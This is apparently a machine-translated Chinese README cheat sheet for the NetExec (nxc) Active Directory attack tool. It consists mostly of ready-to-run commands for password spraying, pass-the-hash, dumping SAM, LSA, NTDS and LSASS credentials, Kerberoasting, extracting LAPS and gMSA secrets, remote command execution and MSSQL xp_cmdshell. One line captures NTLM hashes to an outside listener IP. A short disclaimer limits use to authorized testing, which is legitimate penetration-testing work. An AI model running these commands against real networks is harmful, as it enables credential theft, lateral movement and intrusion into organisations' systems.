<!-- language-home-navigation -->
[🏠 中文主页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ⚡ NetExec (nxc) - 完整备忘单

[🇹🇷 Türkçe Sürüm]（翻译/README.tr.md）
```
  ███╗   ██╗███████╗████████╗███████╗██╗  ██╗███████╗ ██████╗ 
  ████╗  ██║██╔════╝╚══██╔══╝██╔════╝╚██╗██╔╝██╔════╝██╔════╝ 
  ██╔██╗ ██║█████╗     ██║   █████╗   ╚███╔╝ █████╗  ██║     
  ██║╚██╗██║██╔══╝     ██║   ██╔══╝   ██╔██╗ ██╔══╝  ██║     
  ██║ ╚████║███████╗   ██║   ███████╗██╔╝ ██╗███████╗╚██████╗ 
  ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ 
        The Network Swiss Army Knife (CrackMapExec Successor)
```
<p对齐=“中心”>
  <img src="https://img.shields.io/badge/NetExec-nxc-blue?style=for-the-badge" alt="NetExec">
  <img src="https://img.shields.io/badge/CME_Successor-Active_Development-green?style=for-the-badge" alt="CME 后继者">
  <img src="https://img.shields.io/badge/Multi_Protocol-SMB_LDAP_MSSQL-orange?style=for-the-badge" alt="多协议">
  <img src="https://img.shields.io/badge/Network-Pentesting-red?style=for-the-badge" alt="网络渗透测试">
</p>

<p对齐=“中心”>
  <b>🌐 CrackMapExec 的官方、社区驱动的后继者，用于网络和 Active Directory 开发</b>
</p>

---

## 📋 目录

- [简介](#-简介)
- [为什么 NetExec 优于 CrackMapExec？](#-why-netexec-over-crackmapexec)
- [安装](#-安装)
- [支持的协议](#-supported-protocols)
- [SMB利用](#-smb-exploitation)
  - [侦察与分享枚举](#reconnaissance--share-enumeration)
  - [密码喷射和凭证测试](#password-spraying--credential-testing)
  - [传递哈希 (PtH) 和传递票证 (PtT)](#pass-the-hash-pth--pass-the-ticket-ptt)
  - [凭证转储（SAM、LSA、NTDS）](#credential-dumping-sam-lsa-ntds)
  - [命令执行](#command-execution)
- [LDAP 漏洞利用](#-ldap-exploitation)
  - [域名枚举和密码策略](#domain-enumeration--password-policy)
  - [AS-REP 烘焙和 Kerberoasting](#as-rep-roasting--kerberoasting)
  - [LAPS 和 gMSA 提取](#laps--gmsa-extraction)
  - [BloodHound 数据摄取](#bloodhound-data-ingestion)
- [MSSQL 漏洞利用](#-mssql-exploitation)
- [WinRM、RDP 和 SSH 模块](#-winrm-rdp--ssh-modules)
- [流行的 NetExec 模块 (`-M`)](#-popular-netexec-modules--m)
- [工作空间和内置数据库](#-workspaces--built-in-database)
- [快速参考表](#-quick-reference-table)
- [提示和最佳实践](#-tips--best-practices)
- [法律免责声明](#-legal-disclaimer)
- [资源](#-资源)

---

## 🎯 简介

**NetExec** (`nxc`) 是一种多用途后利用工具，旨在自动评估大型 Active Directory 和 Windows 网络。它是 **CrackMapExec** (CME) 的官方活跃社区分支和延续，在 CME 退休后创建并由其原作者存档。

NetExec 充当网络“瑞士军刀”，与 SMB、LDAP、MSSQL、WinRM、RDP、SSH、FTP 和 VNC 无缝连接，以自动执行身份验证、凭证转储、漏洞检查和横向移动。

---

## ⚖️ 为什么选择 NetExec 而不是 CrackMapExec？

|特色 | CrackMapExec（CME）| NetExec（nxc）|
|--------|--------------------|------------------------|
| **发展状况** | 🛑 已存档/已弃用 | 🟢 积极维护 |
| **Python 支持** |旧版（Python 3.8-3.10）|现代Python 3.10+ |
| **协议支持** | SMB、LDAP、MSSQL、WinRM、SSH | + VNC、FTP、RDP、WMI 增强 |
| **寻血猎犬支持** |仅限寻血猎犬遗产 | BloodHound CE 和遗产 |
| **Kerberos 和 PKINIT** |有限公司|强大的 PKINIT 和 Kerberos 票证支持 |
| **错误修复和模块** |冷冻|不断更新CVE和漏洞利用模块 |

---

## 📥 安装

### 使用 pipx（推荐）
```bash
pipx install netexec
```
### 卡利Linux

NetExec 是 Kali 中 CrackMapExec 的官方替代品：
```bash
sudo apt update && sudo apt install -y netexec
```
### 码头工人
```bash
docker run -it --rm -v ~/.nxc:/root/.nxc ghcr.io/penny-os/netexec:latest smb 10.10.10.0/24
```
＃＃＃ 确认
```bash
nxc --version
```
---

## 🔌 支持的协议

NetExec 接受目标协议作为其主要参数：
```bash
nxc <protocol> <target(s)> [options]
```
- `nxc smb` - 服务器消息块（共享、SAM/LSA/NTDS 转储、命令执行）
- `nxc ldap` - 轻量级目录访问协议（Kerberoasting、BloodHound、LAPS）
- `nxc mssql` - Microsoft SQL Server（数据库查询、xp_cmdshell、模拟）
- `nxc winrm` - Windows 远程管理（隐形命令执行）
- `nxc rdp` - 远程桌面协议（身份验证、屏幕截图）
- `nxc ssh` - 安全 Shell（Linux/UNIX 凭证测试和执行）
- `nxc ftp` / `nxc vnc` - 文件传输和虚拟网络计算

---

## 🛡️ SMB 剥削

### 侦察和分享枚举
```bash
# Discover live hosts and check SMB signing status
nxc smb 10.10.10.0/24

# Enumerate null/anonymous sessions
nxc smb 10.10.10.50 -u '' -p '' --shares
nxc smb 10.10.10.50 -u 'guest' -p '' --shares

# Enumerate readable shares with credentials
nxc smb 10.10.10.0/24 -u 'alice' -p 'Welcome2026!' --shares

# Spider shares for sensitive files (e.g., matching config, password, or bak)
nxc smb 10.10.10.50 -u 'alice' -p 'Welcome2026!' -M spider_plus
```
### 密码喷射和凭证测试
```bash
# Check domain password policy before spraying (Prevents account lockouts!)
nxc smb 10.10.10.1 -u 'alice' -p 'Welcome2026!' --pass-pol

# Password spray a single password against a list of users
nxc smb 10.10.10.1 -u users.txt -p 'SeasonYear2026!' --continue-on-success

# Credential stuffing with user:pass pairs
nxc smb 10.10.10.1 -u users.txt -p passwords.txt --no-bruteforce
```
### 哈希传递 (PtH) 和票证传递 (PtT)
```bash
# Authenticate using NTLM hash
nxc smb 10.10.10.0/24 -u 'Administrator' -H 'fc525c9680e4760a094da0c9ec5f0d94' --local-auth

# Authenticate using Kerberos ccache ticket
export KRB5CCNAME=/path/to/ticket.ccache
nxc smb dc01.corp.local -k --shares
```
### 凭证转储（SAM、LSA、NTDS）
```bash
# Dump local SAM database (Requires administrative privileges)
nxc smb 10.10.10.50 -u 'Administrator' -H 'hash' --sam

# Dump LSA secrets (Service accounts, cleartext passwords)
nxc smb 10.10.10.50 -u 'Administrator' -H 'hash' --lsa

# Dump Active Directory NTDS.dit database via VSS on Domain Controller
nxc smb 10.10.10.1 -u 'Administrator' -p 'Password123' --ntds
```
### 命令执行
```bash
# Execute command via WMI (default)
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' -x 'whoami /all'

# Execute command via PowerShell
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' -X 'Get-Process'

# Execute command via SMBexec or atexec
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' --exec-method smbexec -x 'ipconfig'
```
---

## 🌳 LDAP 漏洞利用

### 域枚举和密码策略
```bash
# Dump domain users
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --users

# Dump domain groups and memberships
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --groups

# Check for active domain computers
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --computers
```
### AS-REP 烘焙和 Kerberoasting
```bash
# Identify and dump AS-REP Roastable accounts (DONT_REQ_PREAUTH)
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --asreproast asrep_hashes.txt

# Request Kerberos Service Tickets (Kerberoasting)
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --kerberoasting kerberoast_hashes.txt
```
### LAPS 和 gMSA 提取
```bash
# Extract Microsoft LAPS (Local Administrator Password Solution) passwords
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' -M laps

# Dump Group Managed Service Account (gMSA) passwords
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' -M gmsa
```
### BloodHound 数据摄取
```bash
# Collect BloodHound data natively over LDAP
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --bloodhound --collection All
```
---

## 🗄️ MSSQL 漏洞利用
```bash
# Test MSSQL authentication across network
nxc mssql 10.10.10.0/24 -u 'sa' -p 'DatabasePassword!'

# Check for privilege escalation via server links
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -M enum_links

# Enable xp_cmdshell and execute operating system command
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -x 'whoami'

# Capture NetNTLMv2 hash by triggering xp_dirtree
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -M capture-ntlm -o IP=192.168.1.100
```
---

## 🚀 WinRM、RDP 和 SSH 模块

### WinRM 命令执行
```bash
nxc winrm 10.10.10.50 -u 'Administrator' -p 'Pass123' -x 'whoami'
```
### RDP 屏幕截图和身份验证
```bash
# Check RDP credentials and capture login screenshot
nxc rdp 10.10.10.50 -u 'Administrator' -p 'Pass123' --screenshot
```
### SSH 喷射和命令
```bash
nxc ssh 10.10.10.0/24 -u 'root' -p 'toor' -x 'id'
```
---

## 🧩 流行的 NetExec 模块 (`-M`)

|模块|协议|描述 |示例|
|--------|----------|-------------|---------|
| `spooler` |中小企业|检查Print Spooler 服务是否正在运行(PrinterBug) | `nxc smb <IP> -M spooler` |
| `zerologon` |中小企业|检查CVE-2020-1472漏洞 | `nxc smb <IP> -M zerologon` |
| `nopac` |中小企业|检查 CVE-2021-42278 / CVE-2021-42287 | `nxc smb <IP> -M nopac` |
| `petitpotam` |中小企业|检查主机是否容易受到 PetitPotam 强制 | `nxc smb <IP> -M petitpotam` |
| `nanodump` |中小企业|使用 nanodump 秘密转储 LSASS 内存小型转储 | `nxc smb <IP> -u admin -p pass -M nanodump`|
| `webdav`|中小企业|检查 WebDAV 中继的 WebClient 服务是否处于活动状态 | `nxc smb <IP> -M webdav` |
| `laps` | LDAP |转储工作站的 LAPS 密码 | `nxc ldap <IP> -u u -p p -M laps` |
| `gmsa`| LDAP |提取组托管服务帐户机密 | `nxc ldap <IP> -u u -p p -M gmsa`|

---

## 💾 工作区和内置数据库

NetExec 自动将所有发现的主机、有效凭据和转储哈希值记录到本地 SQLite 数据库 (`~/.nxc/workspaces/`) 中：
```bash
# View all stored credentials
nxc-database credentials

# View discovered hosts
nxc-database hosts

# Create and switch to a new client engagement workspace
nxc-database workspace create ClientAlpha
nxc-database workspace switch ClientAlpha
```
---

## 📊 快速参考表

|任务|协议|命令 |
|------|----------|---------|
| **枚举股份** |中小企业| `nxc smb <IP> -u '' -p '' --shares` |
| **检查通行证政策** |中小企业| `nxc smb <DC> -u 'user' -p 'pass' --pass-pol` |
| **密码喷雾** |中小企业| `nxc smb <IP> -u users.txt -p 'Pass' --continue-on-success` |
| **传递哈希** |中小企业| `nxc smb <IP> -u 'admin' -H <NT_HASH> --local-auth` |
| **转储 SAM** |中小企业| `nxc smb <IP> -u 'admin' -H <HASH> --sam` |
| **转储 NTDS** |中小企业| `nxc smb <DC> -u 'admin' -p 'pass' --ntds` |
| **AS-REP 烘焙** | LDAP | `nxc ldap <DC> -u 'user' -p 'pass' --asreproast hashes.txt` |
| **Kerberoasting** | LDAP | `nxc ldap <DC> -u 'user' -p 'pass' --kerberoasting hashes.txt` |
| **寻血猎犬转储** | LDAP | `nxc ldap <DC> -u 'user' -p 'pass' --bloodhound --collection All` |
| **MSSQL xp_cmdshell**|微软SQL | `nxc mssql <IP> -u 'sa' -p 'pass' -x 'whoami'` |

---

## 💡 提示和最佳实践

1. **始终首先检查密码策略：**
   在启动任何密码喷雾之前，请始终运行 `nxc smb <DC> -u <USER> -p <PASS> --pass-pol` 来检查 `Account Lockout Threshold`。如果设置为 3 或 5，则每 30 分钟以上仅喷洒一次，以避免锁定域帐户。
2. **将 `--local-auth` 用于工作站：**
   跨工作站测试本地管理员凭据而不是域凭据时，请始终包含 `--local-auth` 标志。
3. **旋转集成：**
   NetExec 可通过 SOCKS 代理（例如 `proxychains nxc smb ...`）或 Ligolo-ng TUN 接口以本机速度无缝工作！

---

## ⚠️ 法律免责声明

> **重要提示：** NetExec 是一种攻击性安全评估工具。它必须严格用于您已获得明确、记录在案的授权的计算机网络和域基础设施。

---

## 📚 资源

- [NetExec 官方 GitHub 存储库](https://github.com/Pennyw0rth/NetExec)
- [NetExec 官方文档](https://www.netexec.wiki/)